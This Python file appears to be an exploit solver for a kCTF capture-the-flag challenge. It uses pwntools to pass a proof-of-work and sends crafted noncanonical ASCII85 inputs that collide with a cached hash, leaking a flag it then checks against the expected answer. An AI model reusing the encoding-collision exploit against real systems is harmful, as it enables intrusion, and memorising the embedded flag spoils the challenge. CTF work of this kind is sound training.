#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

r.send(b"""
plain plain a
plain plain b
plain plain c
plain plain d
plain plain e
plain plain f
plain plain g
plain plain h
a85 plain e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279dZZZZFS5p|moRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPV
a85 plain e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279dZZZZmoRPVFS5p|moRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPV
a85 plain e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279dZZZZmoRPVmoRPVFS5p|moRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPV
a85 plain e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279dZZZZmoRPVmoRPVmoRPVFS5p|moRPVmoRPVmoRPVmoRPVmoRPVmoRPVmoRPV
a85 plain e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279dZZZZmoRPVmoRPVmoRPVmoRPVFS5p|moRPVmoRPVmoRPVmoRPVmoRPVmoRPV
a85 plain e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279dZZZZmoRPVmoRPVmoRPVmoRPVmoRPVFS5p|moRPVmoRPVmoRPVmoRPVmoRPV
plain plain 2015
exit exit exit
""")

flag = 'none'
output = r.recvall()
print("Out:", output)
for line in output.splitlines():
  if line.startswith(b'Serving from cache'):
    flag = line.strip().split()[-1]

print("Flag:", flag)
assert flag.startswith(b'CTF{nonc4nonical_3ncod1ngs_g00d_for_stego_g00d_for_pwn}')

exit(0)
